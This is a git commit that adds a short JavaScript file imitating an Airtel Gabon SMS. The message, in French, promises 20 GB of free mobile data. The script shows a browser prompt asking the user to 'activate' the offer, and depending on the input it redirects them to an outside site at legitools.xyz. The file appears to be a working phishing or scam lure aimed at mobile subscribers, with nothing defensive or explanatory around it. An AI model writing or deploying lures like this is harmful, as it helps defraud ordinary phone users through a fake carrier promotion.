63b294b8cb7fd06e9da4a052656a48c64855c108
harryjohnson86 <mfonjohnson86@gmail.com>
2025-07-06 09:45:35 -0700

    Create airtelgabon-free20godata.js

---
+++ airtelgabon-free20godata.js
@@ -0,0 +1,5 @@
+var password = '20 Go de données gratuites'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 20 Go de données gratuites de la part de la carte SIM AIRTEL. Veuillez appuyer sur OK pour ACTIVER. ','20 Go de données gratuites');
+if (password != '20 Go de données gratuites') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
